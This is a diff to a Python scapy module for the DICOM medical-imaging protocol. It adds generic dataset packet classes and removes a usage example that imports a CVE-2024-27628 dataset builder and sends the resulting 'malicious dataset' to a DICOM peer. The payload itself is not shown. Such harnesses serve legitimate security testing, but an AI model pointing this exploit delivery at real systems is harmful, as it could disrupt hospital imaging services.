@@ -5,7 +5,6 @@ from scapy.supersocket import StreamSocket
 import socket
 from scapy.layers.inet import TCP
 import struct
-from cve_datasets import create_cve_2024_27628_dataset
 
 # ------------------- DICOM Base Protocol Support -------------------
 class DICOM(Packet):
@@ -50,6 +49,26 @@ class DICOMVariableItem(Packet):
             length = len(self.data)
             p = p[:2] + struct.pack("!H", length) + p[4:]
         return p + pay
+    
+class DICOMField(Packet):
+    fields_desc = [
+        ShortField("group", None),
+        ShortField("element", None),
+        StrFixedLenField("VR", None, 2),
+        ShortField("reserved", 0),
+        FieldLenField("length", None, fmt="I"),
+        StrLenField("value", "", length_from=lambda x: x.length)
+    ]
+
+    def __init__(self, group, element, VR, value, **kwargs):
+        super().__init__(group=group, element=element, VR=VR, 
+                        length=len(value), value=value, **kwargs)
+        
+class DICOMDataset(Packet):
+    fields_desc = [PacketListField("fields", [], DICOMField)]
+    
+    def __bytes__(self):
+        return b"".join(bytes(field) for field in self.fields)
 
 class UserInformationItem(Packet):
     name = "User Information Sub-item"
@@ -294,24 +313,3 @@ class DICOMSession:
             pass
         self.assoc_established = False
         self.s.close()
-
-# ------------------- Usage Example -------------------
-if __name__ == "__main__":
-    try:
-        # Associate with remote AE
-        session = DICOMSession("TEST_CLIENT", "TEST_AE", "localhost")
-        if session.associate():
-            print("Association established")
-            # Send malicious dataset
-            malicious_data = create_cve_2024_27628_dataset()
-            session.send_data(malicious_data)
-            # Graceful release
-            if session.release():
-                print("Association released")
-            else:
-                session.abort()
-        else:
-            print("Association failed")
-    except Exception as e:
-        print(f"Error: {e}")
-        session.abort()
